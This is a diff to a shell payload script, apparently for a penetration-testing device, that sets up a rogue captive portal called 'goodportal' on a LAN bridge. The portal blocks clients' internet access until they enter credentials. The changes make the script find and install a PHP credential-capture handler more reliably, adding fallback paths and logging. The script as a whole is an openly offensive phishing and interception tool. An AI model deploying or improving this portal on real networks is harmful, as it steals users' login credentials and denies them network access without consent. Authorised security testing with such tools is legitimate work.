@@ -52,7 +52,15 @@
 BRIDGE_MASTER="br-lan"
 PORTAL_IP="172.16.52.1"
 PORTAL_ROOT="/www/goodportal"
-PAYLOAD_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+# Resolve real payload directory (Pager-safe)
+SCRIPT_PATH="$(readlink -f "$0" 2>/dev/null || echo "$0")"
+PAYLOAD_DIR="$(cd "$(dirname "$SCRIPT_PATH")" && pwd)"
+
+# Fallback if Pager staging breaks path resolution
+if [ ! -f "$PAYLOAD_DIR/captiveportal.php" ]; then
+    PAYLOAD_DIR="/root/payloads/user/interception/goodportal_configure"
+    LOG "  Using fallback PAYLOAD_DIR: $PAYLOAD_DIR"
+fi
 
 # Warn user about internet blocking
 resp=$(CONFIRMATION_DIALOG "WARNING: This payload will block internet access to clients on the LAN! Clients will NOT have internet access until credentials are entered (like a real captive portal). Internet blocking persists until 'goodportal Remove' payload is executed. Continue?")
@@ -353,15 +361,35 @@ if [ "$PHP_REQUIRED" -eq 1 ]; then
     LOG "  Setting up credential capture endpoint..."
     mkdir -p $PORTAL_ROOT/captiveportal
     
-    # Copy credential capture stub from payload directory
-    if [ -f "$PAYLOAD_DIR/captiveportal.php" ]; then
-        cp "$PAYLOAD_DIR/captiveportal.php" $PORTAL_ROOT/captiveportal/index.php
-        chmod 644 $PORTAL_ROOT/captiveportal/index.php
-        LOG "  Installed credential capture handler"
+    # Copy credential capture stub (robust path handling)
+LOG "  Locating captiveportal.php..."
+
+CANDIDATE_PATHS=(
+    "$PAYLOAD_DIR/captiveportal.php"
+    "/root/payloads/user/interception/goodportal_configure/captiveportal.php"
+    "./captiveportal.php"
+)
+
+FOUND_PATH=""
+
+for path in "${CANDIDATE_PATHS[@]}"; do
+    if [ -f "$path" ]; then
+        FOUND_PATH="$path"
+        LOG "  Found captiveportal.php at: $FOUND_PATH"
+        break
     else
-        LOG red "  [ERROR]: captiveportal.php not found in payload directory"
-        exit 1
+        LOG "  Checked: $path (not found)"
     fi
+done
+
+if [ -n "$FOUND_PATH" ]; then
+    cp "$FOUND_PATH" $PORTAL_ROOT/captiveportal/index.php
+    chmod 644 $PORTAL_ROOT/captiveportal/index.php
+    LOG "  Installed credential capture handler"
+else
+    LOG red "  [ERROR]: captiveportal.php not found in ANY expected location"
+    exit 1
+fi
 fi
 
 # Create complete nginx.conf with heredoc
